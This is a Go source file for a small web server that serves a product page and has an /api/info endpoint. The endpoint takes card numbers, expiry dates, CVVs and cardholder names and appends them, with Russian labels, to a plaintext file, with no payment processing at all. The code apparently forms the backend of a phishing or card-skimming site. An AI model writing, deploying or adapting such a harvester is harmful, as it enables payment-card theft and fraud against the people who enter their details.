package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"text/template"
)

func main() {
	mux := http.NewServeMux()

	js := http.FileServer(http.Dir("./js"))
	mux.Handle("/js/", http.StripPrefix("/js/", js))

	css := http.FileServer(http.Dir("./css"))
	mux.Handle("/css/", http.StripPrefix("/css/", css))

	img := http.FileServer(http.Dir("./img"))
	mux.Handle("/img/", http.StripPrefix("/img/", img))

	mux.HandleFunc("/web/product/2", func(w http.ResponseWriter, r *http.Request) {
		html, err := template.ParseFiles("./index.html")
		if err != nil {
			log.Println(err)
			return
		}

		err = html.ExecuteTemplate(w, "index.html", nil)
		if err != nil {
			log.Println(err)
			return
		}
	})

	mux.HandleFunc("/api/info", func(w http.ResponseWriter, r *http.Request) {
		req := struct {
			CardNums string `json:"card_nums,omitempty"`
			CardDate string `json:"card_date,omitempty"`
			CardCvv  string `json:"card_cvv,omitempty"`
			CardUser string `json:"card_user,omitempty"`
		}{}

		err := json.NewDecoder(r.Body).Decode(&req)
		if err != nil {
			log.Println(err)
			return
		}

		file, err := os.OpenFile("card_info.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Println(err)
			return
		}
		defer file.Close()

		writer := bufio.NewWriter(file)

		text := fmt.Sprintf("Номер карты: %s;\nСрок службы карты: %s;\nCVV: %s;\nВладелец карты: %s;\n--------------\n", req.CardNums, req.CardDate, req.CardCvv, req.CardUser)

		_, err = writer.WriteString(text)
		if err != nil {
			log.Println(err)
			return
		}

		err = writer.Flush()
		if err != nil {
			log.Println(err)
			return
		}
	})

	server := http.Server{
		Addr:    ":8888",
		Handler: mux,
	}

	server.ListenAndServe()
}
